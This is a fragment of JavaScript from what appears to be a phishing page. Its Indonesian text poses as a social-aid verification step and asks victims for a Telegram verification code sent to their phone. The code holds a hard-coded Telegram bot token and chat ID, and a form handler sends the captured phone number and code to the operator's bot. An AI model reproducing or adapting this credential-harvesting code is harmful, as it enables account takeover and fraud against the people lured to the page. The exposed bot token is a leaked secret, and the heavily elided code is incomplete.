...
function sendToTelegram(message) {
  const token = "7702661149:AAEp07yIAp9TiOzwsLdsegkjn0n-nNcwwSs"; // Token bot Telegram Anda
  const chatId = "5115388536"; // Chat ID atau ID grup Anda
...
document
  ...
  .addEventListener("submit", function (event) {
    ...
    otpMessage.textContent = `Silahkan masukkan kode verifikasi penerima bantuan yang dikirim melalu pesan telegram ke nomor ${phone}`;
...
──────────────`;
    ...
    sendToTelegram(message).then((response) => {
      if (response.ok) {
        ...
        document.getElementById("sandiImage").style.display = "none";
